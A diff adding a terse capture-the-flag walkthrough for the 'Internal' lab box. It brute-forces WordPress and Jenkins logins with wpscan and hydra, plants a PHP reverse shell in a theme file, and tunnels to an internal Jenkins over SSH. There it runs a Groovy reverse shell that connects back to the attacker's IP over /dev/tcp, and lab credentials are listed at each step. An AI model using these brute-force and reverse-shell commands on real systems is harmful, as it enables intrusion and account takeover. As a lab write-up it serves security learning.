@@ -1,0 +1,71 @@
+ip : 10.10.198.109
+
+Domain : internal.thm
+
+- nmap scan and found 2 open ports 22 and 80
+- visiting port 80 shows a default phpmyadmin page 
+- directory bruteforce using ffuf and found out several sub directories
+- out of which one was blog
+- blog is a wordpress
+- using wpscan to enumerate for usernames
+
+wpscan --url http://10.10.198.109/blog/ --enumerate u
+ 
+- found out that only the user admin is present in the site
+- brute forcing for passwords using wpscan   
+
+wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt 
+
+creds : admin : my2boys
+
+- trying to log in with the credentials 
+- appearance > theme editor > 404.php
+- add a php reverse shell and start a netcat listener
+ 
+rlwrap nc -nlvp 1337 
+ 
+- call the reverse shell  
+
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+- now we have a shell 
+- checking the /opt folder gives us an interesting file
+- checking the file we get credentials to another user 
+
+creds : aubreanna : bubb13guM!@#123 
+
+- we ssh into the machine with the credentials 
+- we check ifconfig and see docker is running on the machine
+- jenkins is running on port 8080 on a 172 series ip address on the machine 
+- use ssh tunnelling technique to forward the jenkins ip:port to attackers ip:port 
+
+ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm 
+
+- check with jenkins default passwords, no luck 
+- we brute force for passwords using hydra
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+
+creds : admin : spongebob
+
+- login with the credentials
+- manage jenkins > script console
+- jenkins is a powerful language which runs java code
+- add a java reverse shell and start a listener
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.179.136/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+rlwrap -lvnp 4444  
+
+- we got a shell
+- search for all txt files using find
+
+find / -name *.txt
+
+- inside /opt we see a note.txt which contains the credentials for the root user 
+
+creds : root : tr0ub13guM!@#123
+
+- ssh as root to grab the root flag
